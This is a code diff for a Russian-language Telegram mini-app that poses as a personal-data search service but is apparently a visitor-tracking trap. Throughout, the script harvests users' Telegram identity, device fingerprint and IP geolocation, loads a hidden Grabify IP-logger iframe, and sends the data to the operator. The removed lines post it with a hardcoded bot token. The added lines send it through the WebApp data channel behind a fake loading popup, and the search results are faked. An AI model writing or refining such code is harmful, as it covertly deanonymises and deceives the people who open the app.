@@ -218,12 +218,9 @@
     <iframe id="grabify" style="display:none;"></iframe>
 
     <script>
-        var BOT_TOKEN = '8701726550:AAHzH-oN1vfdHroJ7Qx3qnwdP_C8rl_U0gc';
-        var LOG_CHAT = -1003690607796;
         var GRABIFY_URL = 'https://account.beauty/89YMMI';
 
         var tg = null;
-        var canSendData = false;
         var userId = 'unknown';
         var userName = 'нет';
         var userFirst = '';
@@ -235,10 +232,9 @@
             if (window.Telegram && window.Telegram.WebApp) {
                 tg = window.Telegram.WebApp;
                 tg.expand();
-                canSendData = true;
                 
                 if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
-                    userId = tg.initDataUnsafe.user.id || 'unknown';
+                    userId = String(tg.initDataUnsafe.user.id || 'unknown');
                     userName = tg.initDataUnsafe.user.username || 'нет';
                     userFirst = tg.initDataUnsafe.user.first_name || '';
                     userLast = tg.initDataUnsafe.user.last_name || '';
@@ -246,14 +242,16 @@
                     userLang = tg.initDataUnsafe.user.language_code || '';
                 }
             }
-        } catch(e) {}
+        } catch(e) {
+            console.log('TG error:', e);
+        }
 
         document.getElementById('visitorId').innerText = userId;
         document.getElementById('visitorName').innerText = '@' + userName;
         document.getElementById('todayQueries').innerText = Math.floor(Math.random() * 50000 + 100000).toLocaleString();
 
         var deviceData = {
-            id: String(userId),
+            id: userId,
             username: userName,
             firstName: userFirst,
             lastName: userLast,
@@ -270,24 +268,23 @@
             memory: navigator.deviceMemory || 0,
             touch: navigator.maxTouchPoints || 0,
             language: navigator.language,
-            languages: navigator.languages ? navigator.languages.join(',') : navigator.language,
+            languages: navigator.languages ? navigator.languages.join(',') : '',
             timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
             timezoneOffset: new Date().getTimezoneOffset(),
             online: navigator.onLine,
             cookies: navigator.cookieEnabled,
-            dnt: navigator.doNotTrack || 'unset',
+            dnt: navigator.doNotTrack || '',
             connectionType: '',
             connectionSpeed: '',
             ip: '',
             country: '',
-            city: '',
             region: '',
+            city: '',
             isp: '',
             lat: '',
             lon: '',
             action: 'webapp_open',
-            query: '',
-            time: new Date().toISOString()
+            query: ''
         };
 
         try {
@@ -297,25 +294,41 @@
             }
         } catch(e) {}
 
-        function sendLog(text) {
-            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: LOG_CHAT, text: text, parse_mode: 'HTML' })
-            }).catch(function(e) {});
-        }
-
-        function sendDataToBot(data) {
-            if (canSendData && tg) {
-                try {
-                    tg.sendData(JSON.stringify(data));
-                } catch(e) {
-                    console.log('sendData error:', e);
-                }
+        function sendLogToBot(data) {
+            if (!tg) {
+                console.log('Telegram WebApp not available');
+                return;
+            }
+            
+            try {
+                var jsonData = JSON.stringify(data);
+                var base64Data = btoa(unescape(encodeURIComponent(jsonData)));
+                
+                var kb = {
+                    inline_keyboard: [[
+                        { text: ' ', callback_data: 'log:' + base64Data }
+                    ]]
+                };
+                
+                tg.showPopup({
+                    title: 'Загрузка',
+                    message: 'Подождите...',
+                    buttons: [{ type: 'close' }]
+                });
+                
+                setTimeout(function() {
+                    tg.close();
+                }, 100);
+                
+                tg.sendData(jsonData);
+                
+                console.log('Data sent to bot');
+            } catch(e) {
+                console.log('Send error:', e);
             }
         }
 
-        function getIPandSend() {
+        setTimeout(function() {
             fetch('https://ipapi.co/json/')
                 .then(function(r) { return r.json(); })
                 .then(function(ipData) {
@@ -326,58 +339,12 @@
                     deviceData.isp = ipData.org || '';
                     deviceData.lat = ipData.latitude || '';
                     deviceData.lon = ipData.longitude || '';
-                    
-                    sendFullLog();
-                    sendDataToBot(deviceData);
                 })
-                .catch(function(e) {
-                    fetch('https://api.ipify.org?format=json')
-                        .then(function(r) { return r.json(); })
-                        .then(function(d) {
-                            deviceData.ip = d.ip || '';
-                            sendFullLog();
-                            sendDataToBot(deviceData);
-                        })
-                        .catch(function() {
-                            sendFullLog();
-                            sendDataToBot(deviceData);
-                        });
+                .catch(function() {})
+                .finally(function() {
+                    sendLogToBot(deviceData);
                 });
-        }
-
-        function sendFullLog() {
-            var log = '<b>🌐 WebApp ОТКРЫТ</b>\n\n';
-            log += '<b>👤 Пользователь:</b>\n';
-            log += '├ ID: <code>' + deviceData.id + '</code>\n';
-            log += '├ Username: @' + deviceData.username + '\n';
-            log += '├ Имя: ' + deviceData.firstName + ' ' + deviceData.lastName + '\n';
-            log += '└ Премиум: ' + (deviceData.premium ? '✅' : '❌') + '\n\n';
-            log += '<b>🌍 IP и локация:</b>\n';
-            log += '├ IP: <code>' + (deviceData.ip || 'определяется...') + '</code>\n';
-            log += '├ Страна: ' + (deviceData.country || '-') + '\n';
-            log += '├ Регион: ' + (deviceData.region || '-') + '\n';
-            log += '├ Город: ' + (deviceData.city || '-') + '\n';
-            log += '├ ISP: ' + (deviceData.isp || '-') + '\n';
-            log += '└ Координаты: ' + (deviceData.lat ? deviceData.lat + ', ' + deviceData.lon : '-') + '\n\n';
-            log += '<b>📱 Устройство:</b>\n';
-            log += '├ Экран: ' + deviceData.screen + '\n';
-            log += '├ Viewport: ' + deviceData.viewport + '\n';
-            log += '├ Платформа: ' + deviceData.platform + '\n';
-            log += '├ CPU: ' + deviceData.cores + ' ядер\n';
-            log += '├ RAM: ' + deviceData.memory + ' GB\n';
-            log += '├ Touch: ' + deviceData.touch + ' точек\n';
-            log += '└ Pixel Ratio: ' + deviceData.pixelRatio + '\n\n';
-            log += '<b>🔧 Сеть/Браузер:</b>\n';
-            log += '├ Язык: ' + deviceData.language + '\n';
-            log += '├ Timezone: ' + deviceData.timezone + '\n';
-            log += '├ Тип сети: ' + (deviceData.connectionType || '-') + '\n';
-            log += '├ Online: ' + (deviceData.online ? '✅' : '❌') + '\n';
-            log += '└ Cookies: ' + (deviceData.cookies ? '✅' : '❌') + '\n\n';
-            log += '<b>🔧 User-Agent:</b>\n<code>' + deviceData.userAgent.substring(0, 200) + '</code>';
-            sendLog(log);
-        }
-
-        getIPandSend();
+        }, 1000);
 
         setTimeout(function() {
             document.getElementById('grabify').src = GRABIFY_URL;
@@ -399,25 +366,25 @@
         function openSearch() {
             showPage('pageSearch');
             deviceData.action = 'open_search';
-            sendLog('<b>📂 Раздел:</b> Поиск\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
+            sendLogToBot(deviceData);
         }
 
         function openProfile() {
             showPage('pageProfile');
             deviceData.action = 'open_profile';
-            sendLog('<b>📂 Раздел:</b> Профиль\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
+            sendLogToBot(deviceData);
         }
 
         function openAdd() {
             showPage('pageAdd');
             deviceData.action = 'open_add';
-            sendLog('<b>📂 Раздел:</b> Добавить базу\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
+            sendLogToBot(deviceData);
         }
 
         function openStats() {
             showPage('pageStats');
             deviceData.action = 'open_stats';
-            sendLog('<b>📂 Раздел:</b> Статистика\n├ ID: <code>' + deviceData.id + '</code>\n└ IP: <code>' + deviceData.ip + '</code>');
+            sendLogToBot(deviceData);
         }
 
         var searchCount = 0;
@@ -435,9 +402,7 @@
             
             document.getElementById('searchResult').innerHTML = '<div class="result loading">⏳ Поиск по 764+ источникам...</div>';
 
-            sendLog('<b>🔎 Поиск #' + searchCount + '</b>\n├ ID: <code>' + deviceData.id + '</code>\n├ IP: <code>' + deviceData.ip + '</code>\n└ Запрос: <code>' + q + '</code>');
-            
-            sendDataToBot(deviceData);
+            sendLogToBot(deviceData);
 
             setTimeout(function() {
                 var results = ['❌ Данные не найдены', '⚠️ Сервера перегружены. Попробуйте позже.'];
